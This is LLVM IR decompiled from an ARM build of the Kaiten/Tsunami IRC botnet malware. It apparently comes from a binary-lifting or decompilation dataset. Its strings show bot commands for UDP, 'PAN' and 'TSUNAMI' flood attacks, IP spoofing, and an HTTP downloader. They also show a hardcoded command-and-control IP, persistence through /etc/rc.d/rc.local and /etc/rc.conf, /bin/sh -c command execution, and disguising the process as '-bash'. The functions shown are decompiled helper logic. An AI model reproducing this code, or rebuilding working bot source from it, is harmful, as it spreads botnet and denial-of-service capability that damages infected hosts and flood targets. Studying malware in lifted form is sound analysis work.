source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1800c.5 = global i32 0
@global_var_1801c.6 = global i32* @global_var_1800c.5
@global_var_18458.12 = global i32 0
@global_var_c094.18 = constant i32 -509558771
@global_var_18484.21 = global i32 0
@global_var_1abf8.25 = global i32 0
@global_var_15040.27 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_18480.29 = local_unnamed_addr global i32 0
@global_var_1ad0c.31 = global i32 0
@global_var_1847c.35 = global i32 0
@global_var_15060.37 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_15070.39 = constant i32 114
@global_var_1abf0.41 = global i32 0
@global_var_15074.43 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_15090.45 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_150b4.47 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_150dc.49 = constant [8 x i8] c"http://\00"
@global_var_150e4.51 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_1510c.53 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_15134.55 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_15248.57 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_15264.59 = constant [3 x i8] c"wb\00"
@global_var_15268.61 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_15270.63 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_15288.67 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_152a8.69 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_152d8.71 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_152f8.73 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_15310.75 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_15348.77 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_15354.79 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_15370.82 = constant [9 x i8] c"Disabled\00"
@global_var_1537c.84 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_15398.86 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_153bc.88 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_153dc.90 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_1aaf0.92 = global i32 0
@global_var_15404.94 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_15424.96 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_15440.102 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_15460.105 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_1547c.107 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1549c.109 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_154bc.113 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_15508.115 = constant [3 x i8] c".0\00"
@global_var_18884.117 = global i32 0
@global_var_1550c.120 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_15530.122 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_15558.124 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_15574.126 = constant i32 2
@global_var_155c4.128 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_155ec.130 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_15604.132 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_15628.134 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_1ad00.142 = global i32 0
@global_var_18470.144 = global i32 0
@global_var_1ad08.185 = local_unnamed_addr global i32 0
@global_var_1abf4.187 = global i32 0
@global_var_15df4.208 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_1ad04.211 = local_unnamed_addr global i32 0
@global_var_15e04.213 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_15e14.215 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_15e1c.217 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_15e28.222 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_18024.232 = local_unnamed_addr global i32 1
@global_var_15030.234 = constant [16 x i8] c"212.109.222.122\00"
@global_var_18028.235 = global [16 x i8]* @global_var_15030.234
@global_var_15ea8.238 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_15ebc.241 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_15ecc.243 = constant i32 47
@global_var_15ed0.245 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_15ed8.247 = constant i32 97
@global_var_15edc.249 = constant [6 x i8] c"-bash\00"
@global_var_1abfc.253 = local_unnamed_addr global i32 0
@global_var_15ee4.256 = constant [4 x i8] c"#AS\00"
@global_var_15ee8.259 = constant i32 0
@global_var_15eec.263 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_15f18.267 = constant i32 10
@global_var_15e88.269 = constant [4 x i8] c"352\00"
@global_var_180b0.270 = global [4 x i8]* @global_var_15e88.269
@global_var_15f1c.272 = constant [6 x i8] c"ERROR\00"
@global_var_1aab8.274 = global i32 0
@global_var_180f4 = external local_unnamed_addr global i32
@global_var_1aac8.281 = global i32 0
@global_var_18128.287 = global i32 0
@global_var_188a4.289 = global i32 0
@global_var_fdcc.291 = constant i32 -481296384
@global_var_cff8.292 = constant i32 -442564544
@global_var_188a8.294 = global i32 0
@global_var_18888.296 = global i32 0
@global_var_188a0.301 = global i32 0
@global_var_16224.309 = constant [8 x i8] c"/bin/sh\00"
@global_var_1622c.311 = constant [3 x i8] c"sh\00"
@global_var_16230.313 = constant [3 x i8] c"-c\00"
@global_var_18140.320 = global i32 2
@global_var_18110.326 = global i32 0
@global_var_d708.327 = constant i32 -442564492
@global_var_1810c.329 = global i32* bitcast (i8** @global_var_18144.277 to i32*)
@global_var_16234.335 = constant i32 0
@global_var_d8c8.340 = constant i32 -382910448
@global_var_11684.341 = constant i32 -382909968
@global_var_11740.342 = constant i32 -382910224
@global_var_16268.344 = constant i32 135270416
@global_var_1624c.346 = constant [6 x i8] c"(nil)\00"
@global_var_16254.349 = constant [7 x i8] c"(null)\00"
@global_var_1625c.351 = constant i32 2949163
@global_var_162e8.354 = constant i32 16843008
@global_var_162d0.356 = constant i32 327688
@global_var_18428 = external global i32
@global_var_17292.361 = constant i32 65536
@global_var_162c8.363 = constant [8 x i8] c" +0-#'I\00"
@global_var_16270.365 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_162b0.367 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_162a3.369 = constant i32 117506048
@global_var_162a4.371 = constant i32 252117248
@global_var_16294.373 = constant i32 331776
@global_var_16284.375 = constant i32 335616
@global_var_efec.411 = constant i32 -456978431
@global_var_16304.415 = constant [8 x i8] c"Success\00"
@global_var_162f4.417 = constant [15 x i8] c"Unknown error \00"
@global_var_18430.419 = global i32* @global_var_17292.361
@global_var_ef60.420 = constant i32 -369095446
@global_var_1a8ac.422 = global i32 0
@global_var_1aa7c.426 = global i32 0
@global_var_1a8b0.428 = global i32 0
@global_var_18438.430 = global i32 0
@global_var_1ad44.435 = global i32 0
@global_var_1ad38.438 = global i32 0
@global_var_1aa90.440 = global i32 0
@global_var_18330.443 = global i32 256
@global_var_18234.444 = global i32* @global_var_18330.443
@global_var_1ad10.448 = global i32 0
@global_var_1143c.449 = constant i32 -382910416
@global_var_fe4c.456 = constant i32 -442564520
@global_var_1833c.462 = global i32 0
@global_var_11494.464 = constant i32 -481230848
@global_var_1aaa8.466 = global i32 0
@global_var_11248.468 = constant i32 -509587456
@global_var_18354.470 = global i32 0
@global_var_1836c = external global i32
@global_var_16e60.489 = constant i32 0
@global_var_18408.493 = global i32 0
@global_var_1aaac.497 = local_unnamed_addr global i32 0
@global_var_d810.500 = constant i32 -382910416
@global_var_1aab4.502 = global i32 0
@global_var_18000.505 = global i32 -1
@global_var_1aabc.508 = global i32 0
@global_var_1aac0.510 = local_unnamed_addr global i32 0
@global_var_10d38.511 = constant i32 -390234096
@global_var_16e88.513 = constant [10 x i8] c"/dev/null\00"
@global_var_1aac4.515 = global i32 0
@global_var_d790.519 = constant i32 -382909968
@global_var_1aab0.521 = local_unnamed_addr global i32 0
@global_var_18420 = external local_unnamed_addr global i32
@global_var_cec4.534 = constant i32 -442564608
@global_var_11000.536 = constant i32 -335544701
@global_var_11150.539 = constant i32 -275775369
@global_var_1aaec.542 = global i32 0
@global_var_1aacc.544 = global i32 0
@global_var_17494.546 = constant [4 x i8] c"inf\00"
@global_var_17497.550 = constant i32 1179535616
@global_var_174a4.552 = constant i32 2883630
@global_var_eae8.554 = constant i32 -382908944
@global_var_1aad0.562 = global i32 0
@global_var_1aae8.567 = global i32 0
@global_var_cbe4.572 = constant i32 -382910448
@global_var_1ad48.575 = global i32 0
@global_var_174f0.577 = constant i32 46
@global_var_1ad28.579 = global i32 0
@global_var_13194.581 = constant i32 -369098656
@global_var_174f4.588 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_17508.590 = constant i32 114
@global_var_1750c.592 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_17524.595 = constant [11 x i8] c"nameserver\00"
@global_var_17530.598 = constant [7 x i8] c"domain\00"
@global_var_17538.600 = constant [7 x i8] c"search\00"
@global_var_1ad4c.605 = global i32 0
@global_var_1ad50.607 = global i32 0
@global_var_17554.616 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_17540.618 = constant i32 0
@global_var_17568.621 = constant [3 x i8] c"%x\00"
@global_var_1756c.624 = constant [11 x i8] c"/etc/hosts\00"
@global_var_17578.626 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_18004.632 = global i32 0
@global_var_18454.3 = external global i8*
@global_var_18474.23 = external global i8*
@global_var_18478.33 = external global i8*
@global_var_1847b.224 = external local_unnamed_addr global i8*
@global_var_1847a.225 = external local_unnamed_addr global i8*
@global_var_18479.226 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_18144.277 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_18194.278 = local_unnamed_addr global i8 16
@global_var_10d4c.283 = constant i8 0
@global_var_18145.332 = local_unnamed_addr global i8 1
@global_var_18195.333 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_18434.569 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_18435.570 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_14fe0(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_18454.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_18454.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1801c.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1801c.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1801c.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1801c.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_18454.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1801c.6, { 1, 0 }
  uselistorder i8** @global_var_18454.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 98320 to i32*), align 16
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 98320

bb2:                                              ; preds = %.thread
  ret i32 98320

; uselistorder directives
  uselistorder i32 98320, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_10dec(i32 ptrtoint (i32* @global_var_c094.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 86044, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_1021c()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81cc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 42
  br i1 %v7_81f4, label %dec_label_pc_8228, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %dec_label_pc_81cc
  %v7_8200 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8200, label %dec_label_pc_8298, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v2_820c = icmp eq i8 %v2_81e8, 0
  br i1 %v2_820c, label %dec_label_pc_8218, label %dec_label_pc_82f0

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208
  %v2_821c = load i8, i8* %tmp, align 1
  %v3_821c = zext i8 %v2_821c to i32
  br label %dec_label_pc_8364

dec_label_pc_8228:                                ; preds = %dec_label_pc_81cc
  %v1_822c = add i32 %tmp9, 1
  %v3_8238 = inttoptr i32 %v1_822c to i8*
  %v4_8238 = call i32 @function_81cc(i8* %v3_8238, i32 %arg2)
  %v2_8240 = icmp eq i32 %v4_8238, 0
  br i1 %v2_8240, label %dec_label_pc_8284, label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %dec_label_pc_8228
  %v2_824c = load i8, i8* %tmp, align 1
  %v2_8250 = icmp eq i8 %v2_824c, 0
  br i1 %v2_8250, label %dec_label_pc_828c, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_8248
  %v1_825c = add i32 %arg2, 1
  %v4_8268 = call i32 @function_81cc(i8* nonnull %arg1, i32 %v1_825c)
  %v2_8270 = icmp eq i32 %v4_8268, 0
  br i1 %v2_8270, label %dec_label_pc_8284, label %dec_label_pc_828c

dec_label_pc_8284:                                ; preds = %dec_label_pc_8258, %dec_label_pc_8228
  br label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8248, %dec_label_pc_8258, %dec_label_pc_8284
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8284 ], [ 1, %dec_label_pc_8258 ], [ 1, %dec_label_pc_8248 ]
  br label %dec_label_pc_8364

dec_label_pc_8298:                                ; preds = %dec_label_pc_81fc
  %v2_829c = load i8, i8* %tmp, align 1
  %v2_82a0 = icmp eq i8 %v2_829c, 0
  br i1 %v2_82a0, label %dec_label_pc_82e4, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %dec_label_pc_8298
  %v1_82ac = add i32 %tmp9, 1
  %v1_82b4 = add i32 %arg2, 1
  %v2_82c0 = inttoptr i32 %v1_82ac to i8*
  %v3_82c0 = call i32 @function_81cc(i8* %v2_82c0, i32 %v1_82b4)
  %v2_82c8 = icmp ne i32 %v3_82c0, 0
  %. = zext i1 %v2_82c8 to i32
  br label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82a8, %dec_label_pc_8298
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8298 ], [ %., %dec_label_pc_82a8 ]
  br label %dec_label_pc_8364

dec_label_pc_82f0:                                ; preds = %dec_label_pc_8208
  %v2_82f4 = load i8, i8* %arg1, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  %v1_82fc = call i32 @function_ce90(i32 %v3_82f4)
  store i32 %v1_82fc, i32* @r4, align 4
  %v2_8308 = load i8, i8* %tmp, align 1
  %v3_8308 = zext i8 %v2_8308 to i32
  %v1_8310 = call i32 @function_ce90(i32 %v3_8308)
  %v0_8318 = load i32, i32* @r4, align 4
  %v9_8318 = icmp eq i32 %v0_8318, %v1_8310
  br i1 %v9_8318, label %dec_label_pc_8320, label %dec_label_pc_835c

dec_label_pc_8320:                                ; preds = %dec_label_pc_82f0
  %v1_8324 = add i32 %tmp9, 1
  %v1_832c = add i32 %arg2, 1
  %v2_8338 = inttoptr i32 %v1_8324 to i8*
  %v3_8338 = call i32 @function_81cc(i8* %v2_8338, i32 %v1_832c)
  %v2_8340 = icmp ne i32 %v3_8338, 0
  %.8 = zext i1 %v2_8340 to i32
  br label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_8320, %dec_label_pc_82f0
  %storemerge = phi i32 [ 1, %dec_label_pc_82f0 ], [ %.8, %dec_label_pc_8320 ]
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_828c, %dec_label_pc_8218, %dec_label_pc_835c
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_828c ], [ %storemerge3, %dec_label_pc_82e4 ], [ %v3_821c, %dec_label_pc_8218 ], [ %storemerge, %dec_label_pc_835c ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_ce90, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8364, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_828c, { 2, 1, 0 }
}

define i32 @function_8374(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8374:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8374 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8374, i32* @ip, align 4
  %v6_8378 = load i32, i32* @r2, align 4
  store i32 %v6_8378, i32* %stack_var_-8, align 4
  %v3_837c = load i32, i32* @fp, align 4
  store i32 33668, i32* %stack_var_-16, align 4
  %v2_8380 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8380, i32* @fp, align 4
  %v4_8390 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_18484.21 to i32), i32* @r0, align 4
  %v3_83a4 = call i32 @function_d05c(i32 ptrtoint (i32* @global_var_18484.21 to i32), i32 %arg2, i32 %v4_8390)
  store i32 ptrtoint (i32* @global_var_18484.21 to i32), i32* @r0, align 4
  %v0_83ac = call i32 @function_f030()
  store i32 %v0_83ac, i32* @r2, align 4
  %v3_83c0 = call i32 @function_ce64(i32 %arg1, i32* nonnull @global_var_18484.21)
  store i32 %v3_837c, i32* @fp, align 4
  ret i32 %v3_83c0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18484.21 to i32), { 1, 0, 2 }
}

define i32 @function_83d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_83d8:
  %stack_var_-4 = alloca i32, align 4
  %v3_83dc = load i32, i32* @fp, align 4
  store i32 33764, i32* %stack_var_-4, align 4
  %v2_83e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_83e0, i32* @fp, align 4
  %v2_83f0 = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  %v7_83f4 = icmp eq i8 %v2_83f0, 1
  br i1 %v7_83f4, label %dec_label_pc_83fc, label %dec_label_pc_8420

dec_label_pc_83fc:                                ; preds = %dec_label_pc_83d8
  %v2_8400 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8410 = call i32 @function_8374(i32 %v2_8400, i32 ptrtoint ([30 x i8]* @global_var_15040.27 to i32))
  br label %dec_label_pc_8524

dec_label_pc_8420:                                ; preds = %dec_label_pc_83d8
  %v0_8420 = call i32 @function_cc10()
  %v2_8430 = icmp eq i32 %v0_8420, 0
  br i1 %v2_8430, label %dec_label_pc_8438, label %dec_label_pc_8444

dec_label_pc_8438:                                ; preds = %dec_label_pc_8420
  br label %dec_label_pc_8524

dec_label_pc_8444:                                ; preds = %dec_label_pc_8420
  %v2_8448 = load i32, i32* @global_var_18480.29, align 4
  %v1_844c = add i32 %v2_8448, 1
  store i32 %v1_844c, i32* @global_var_18480.29, align 4
  %v3_8460 = mul i32 %v1_844c, 4
  %v1_8464 = add i32 %v3_8460, 4
  %v1_846c = call i32 @function_fc78(i32 %v1_8464)
  %v2_84c812 = load i32, i32* @global_var_18480.29, align 4
  %v9_84d414 = icmp eq i32 %v2_84c812, 1
  br i1 %v9_84d414, label %dec_label_pc_84dc, label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %dec_label_pc_8444, %dec_label_pc_8484
  %storemerge116 = phi i32 [ %v1_84bc, %dec_label_pc_8484 ], [ 0, %dec_label_pc_8444 ]
  %v3_8488 = mul i32 %storemerge116, 4
  %v2_8494 = add i32 %v3_8488, %v1_846c
  %v2_84a8 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_84ac = add i32 %v2_84a8, %v3_8488
  %v1_84b0 = inttoptr i32 %v2_84ac to i32*
  %v2_84b0 = load i32, i32* %v1_84b0, align 4
  %v2_84b4 = inttoptr i32 %v2_8494 to i32*
  store i32 %v2_84b0, i32* %v2_84b4, align 4
  %v1_84bc = add i32 %storemerge116, 1
  %v2_84c8 = load i32, i32* @global_var_18480.29, align 4
  %v1_84cc = add i32 %v2_84c8, -1
  %tmp = icmp ugt i32 %v1_84cc, %v1_84bc
  br i1 %tmp, label %dec_label_pc_8484, label %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge

dec_label_pc_84c4.dec_label_pc_84dc_crit_edge:    ; preds = %dec_label_pc_8484
  br label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8444, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge
  %v2_84c8.lcssa = phi i32 [ %v2_84c8, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge ], [ %v2_84c812, %dec_label_pc_8444 ]
  %v3_84e4 = mul i32 %v2_84c8.lcssa, 4
  %v2_84f0 = add i32 %v1_846c, -4
  %v1_84f4 = add i32 %v2_84f0, %v3_84e4
  %v2_84fc = inttoptr i32 %v1_84f4 to i32*
  store i32 %v0_8420, i32* %v2_84fc, align 4
  %v2_8504 = load i32, i32* @global_var_1ad0c.31, align 4
  store i32 %v2_8504, i32* @r0, align 4
  %v0_850c = call i32 @function_fdcc()
  store i32 %v1_846c, i32* @global_var_1ad0c.31, align 4
  br label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8438, %dec_label_pc_83fc, %dec_label_pc_84dc
  %v3_8524 = phi i32 [ 0, %dec_label_pc_8438 ], [ 1, %dec_label_pc_83fc ], [ %v0_8420, %dec_label_pc_84dc ]
  store i32 %v3_83dc, i32* @fp, align 4
  ret i32 %v3_8524

; uselistorder directives
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84c812, { 1, 0 }
  uselistorder i32 %v1_846c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8524, { 2, 0, 1 }
  uselistorder label %dec_label_pc_84dc, { 1, 0 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
}

define i32 @function_8548() local_unnamed_addr {
dec_label_pc_8548:
  %v2_855c = load i8*, i8** @global_var_18478.33, align 4
  %v3_855c = ptrtoint i8* %v2_855c to i32
  %v2_8560 = icmp eq i8* %v2_855c, null
  br i1 %v2_8560, label %dec_label_pc_8568, label %dec_label_pc_8578

dec_label_pc_8568:                                ; preds = %dec_label_pc_8548
  %v0_8568 = call i32 @function_10364()
  br label %dec_label_pc_85e4

